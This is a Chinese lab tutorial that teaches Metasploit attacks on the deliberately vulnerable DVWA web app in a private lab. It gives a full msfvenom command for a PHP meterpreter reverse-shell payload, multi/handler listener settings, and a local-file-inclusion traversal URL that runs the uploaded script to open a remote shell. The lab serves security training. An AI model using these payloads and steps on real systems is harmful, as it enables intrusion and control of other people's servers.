# Metasploit 渗透攻击 Web 服务

## 1. 课程说明

本课程为动手实验教程，为了能说清楚实验中的一些操作会加入理论内容，也会精选最值得读的文章推荐给你，在动手实践的同时扎实理论基础。

**注意：实验用的云主机因为配置成本较高，会限制次数，每个实验不超过6次**

## 2. 学习方法

实验楼的 Kali 系列课程包含五个训练营，本训练营主要讲述 Web 应用攻击方法。课程包含20个实验，每个实验都提供详细的步骤和截图。适用于有一定 Linux 系统基础，想快速上手 Kali 渗透测试的同学。

学习方法是多实践，多提问。启动实验后按照实验步骤逐步操作，同时理解每一步的详细内容。

如果实验开始部分有推荐阅读的材料，请务必先阅读后再继续实验，理论知识是实践必要的基础。

## 3. 本节内容简介

本实验中我们初步接触 Kali Linux 和渗透测试的概念。需要依次完成下面几项任务：

- 回顾文件包含漏洞
- 利用 msf 生成攻击脚本
- 利用反弹 shell 登陆目标主机


## 4. 利用 Metasploit 攻击

### 4.1 简介

在前面的章节学习中我们学会了利用本地或者远程文件包含来渗透攻击我们的目标主机。

但是本地包含中使用的是一个伪 webshell，我们只能通过一些简单的命令进行查看文本的内容等等，而远程文件包含中我们使用了一个 php 脚本，来实现 webshell 的功能，由此我们能够进行一些交互的动作，可是若是我们写不出这样的脚本程序岂不是不能实现这样的攻击了？

没关系，即使我们不懂 PHP，写不出反弹 shell 的脚本，我们同样可以利用 metasploit 来帮助我们渗透目标主机。

攻击思路：

- 发现上传漏洞与本地文件包含漏洞（当然此步骤是给我们提供的实验环境）
- 利用 msfvenom 生成反弹 shell 的脚本
- 上传攻击脚本至目标主机
- 利用 msfconsole 监听目标端口
- 利用本地包含执行攻击脚本
- 远程操控目标主机

### 4.2 启动环境

本攻击与上一个实验类似，但是此时我们使用的是 metasploit 来完成，再此之前当然还是我们的实验环境 DVWA 的启动了。

在实验桌面中，双击 Xfce 终端，打开终端：

![此处输入图片的描述](https://doc.shiyanlou.com/document-uid13labid2290timestamp1479374588595.png/wm)

使用 `sudo virsh start Metasploitable2` 命令即可启动我们的靶机系统虚拟机：

![start-metasploit.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139532596.png/wm)

等待大约四分钟，待得虚拟机完全启动之后我们打开桌面上的 Firefox：

![open-firefox.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139552463.png/wm)

访问我们的靶机系统所使用的 IP 地址`192.169.122.102`：

![view-metasploit-url.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139568548.png/wm)

正常的启动靶机系统之后，我们访问其 IP 地址可以得到这样的一个页面。

点击 DVMA 我们便可进入到 DVMA 的登陆页面，默认的登陆用户与密码是 admin 与 password，登陆之后便会进入这样的页面：

![dvwa-index.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139587112.png/wm)

为了能够进行最简单的攻击，我们会把安全默认调制最低，首先进入安全模式的调整页面：

![dvwa-config-security.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139662479.png/wm)

然后调整安全的 level 到 low：

![dvwa-config-security-1.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139678741.png/wm)

当看到页面的下方 Level 的显示变化后，说明修改成功了：

![dvwa-config-security-proof.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139693059.png/wm)

### 4.3 攻击准备

启动环境之后我们便需要生成我们的攻击脚本了，在上一步中我们是提供了一个 php 的反弹 shell 脚本给大家，但是这样的脚本在不了解 php 的情况下，或者找不到类似的脚本的情况下就没办法了。

在 metasploit 为大家提供了一个 msfvenom 的工具，该工具就是利用现有的某块生成木马程序，在 2015 年 8 月之后便用该工具来替代 msfencoder 和 msfpayload。

有了它我们便可不用去熟悉 php、自己手写木马脚本了。

在 Kali 中我们使用该命令来生成木马程序：

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.122.101 LPORT=1111 R > reverse_shell.php
```

在使用 msfvenom 的时候，必须使用 `-p` 参数来生成我们的攻击脚本，该参数的全程也就是 payload。后面紧接着就是使用的模块 reverser_tcp，该脚本属于 php 的攻击脚本，所以在 php/meterpreter 的路径中。`LHOST` 的参数设置的是 kali 本地 IP 地址，因为我们是使用的本地 msfconsole 来建立连接，当然若是我们的 MSF 在其他主机上我们同样可以填写其他的 IP 地址。`LPORT` 是本地主机中一个未被占用的空闲端口。`R >reverse_shell.php` 是将生成好的文本内容重定向输出到 reverse_shell.php 中，该文件若是不存在会自动生成。

该攻击的脚本原理很简单，就是通过让目标主机执行该脚本，通过该脚本向我们的主机发起连接请求，于此同时被我们监听该端口的程序捕捉到，然后便成功的建立连接，然后便远程登陆到 shell 中，就像 ssh 与 telnet 一般。

```
cd /var/www/html
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.122.101 LPORT=1111 R > reverse_shell.php
```

生成该脚本需要一定的时间，大概在 3-5 分钟左右，请大家耐心等待，若是有这样的信息输出表示成功：

![generate_payload](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741081670.png/wm)

在当前的目录中我们可以看到这个文件的存在：

![show_generate_php](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741090178.png/wm)

生成的脚本我们可以通过 `vim reverse_shell.php` 来查看一下生成的脚本：

![show_generate_code.png](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741143459.png/wm)

我们看到生成的脚本源码格式非常的不混乱，一点都不友好，不方便查看。

与此同时我们还看到 `<?php` 的头标签被注释掉了，我们需要去掉该注释才能正常的运行，同时我们也看到了 `$ip` 与 `$port` 这样两个变量，这便是我们刚刚设置的本地 IP 地址与空闲的端口号，若是刚刚设置有误，同样可以在这里修改：

![modify-source-code](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741155220.png/wm)

使用 `:wq` 保存退出。

因为本环境只是使用了 kali 的终端，未有图形界面，所以无法在 Kali 的环境中上传该脚本，我们需要将该脚本传输至本地的实验楼环境中，然后使用 firefox 上传。

利用 shiyanlou 用户的终端，我们使用 scp 工具将该脚本传输至本地：

```
scp root@kali:/var/www/html/reverse_shell.php ./
```

其中 root 表示登陆的用户，kali 表示登陆到的主机，因为我们在 hosts 中添加了别名，kali 别名可以正确的解析出对应的 IP 地址 `192.168.122.101`，`:/var/www/html/reverse_shell` 是指定的我们将要传输的文本，刚刚在使用 msfvenom 时我在 `/var/www/html` 目录中，所以该文件在这个路径中，你的不一定在这个路径中，你可以在 kali 中通过 `pwd` 命令获取当前所在的位置，从而填写相应正确的路径。其中 `./` 表示将需要下载的文件存放至 shiyanlou 用户当前执行命令所在的目录中，通过 `ls -lah |grep reverse` 或者 `ll` 可以看到：

![download_script](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741166568.png/wm)

因为 msfconsole 的启动时间较长，所以我们此时在 kali 的终端中使用 `msfconsole` 命令打开。

接下来的步骤与本地文件包含的方式类似了，首先我们打开 firefox 到 dvwa 平台的上传模块将刚刚的脚本上传到目的主机（当然此处你可以使用远程文件包含的攻击方式，当时远程文件包含的方式非常受限，需要许多的特定条件，所以此处不在演示。）：

![upload_chose_file](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741174923.png/wm)

成功的上传脚本：

![get_upload_path](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741182073.png/wm)

此时我们的 msfconsole 也成功启动了，我们使用相应的模块：

```
use exploit/multi/handler
```

![use_module](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741190323.png/wm)

然后设置我们所使用的攻击脚本：

```
set PAYLOAD php/meterpreter/reverse_tcp
```

![set_payload](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741197463.png/wm)

此时需要加载片刻，成功的加载之后，设置我么我们的 IP 与 端口号了：

```
set LHOST 192.168.122.101

set LPORT 1111
```

![set_localhost](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741206359.png/wm)

我们还可以通过 `show options` 查看我们设置是否无误：

![show_options](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741214167.png/wm)

我们可以使用 `exploit` 亦或者是 `run` 命令开始攻击，两个命令的作用相同，使用任意一个都可以：

![show_run](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741223670.png/wm)

做好这一切准备的工作，我们就使用本地包含来是我们刚刚放置的脚本运行：

```
192.168.122.102/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/reverse_shell.php
```

![show_load](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741232357.png/wm)

因为我们的脚本会与我们的 msfconsole 保持连接，程序无法执行完，所以一直处于加载中的状态，此时我们回头来看看我们的 msfconsole 的变化：

![show_msfconsole](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741242214.png/wm)

做到这一步说明我们已经深入敌军内部了，我们通过 help 可以看到我们可以执行很多命令，这些工具已经为我们提供好了：

![show_help](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741250856.png/wm)

从获取系统信息，当前的进程 IP，执行一个当个命令，再到直接登陆 shell，应有尽有。

我们输入 `shell` 指令：

![show_shell](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741262693.png/wm)

这样就说明我们已经成功登陆到对方 shell 终端了，我们可以输入任何命令：

![show_command](https://doc.shiyanlou.com/document-uid113508labid2427timestamp1482741275740.png/wm)

这样我们便成功的使用 metasploit 完成了目标主机的深入渗透。

## 5. 总结

本节实验中我们学习了以下内容，任何不清楚的地方欢迎到[实验楼问答](https://www.shiyanlou.com/questions)与我们交流：

- 回顾文件包含漏洞
- 利用 msf 生成攻击脚本
- 利用反弹 shell 登陆目标主机

请务必保证自己能够动手完成整个实验，只看文字很简单，真正操作的时候会遇到各种各样的问题，解决问题的过程才是收获的过程。

## 6. 作业

1.利用 mutillidae 完成同样的实验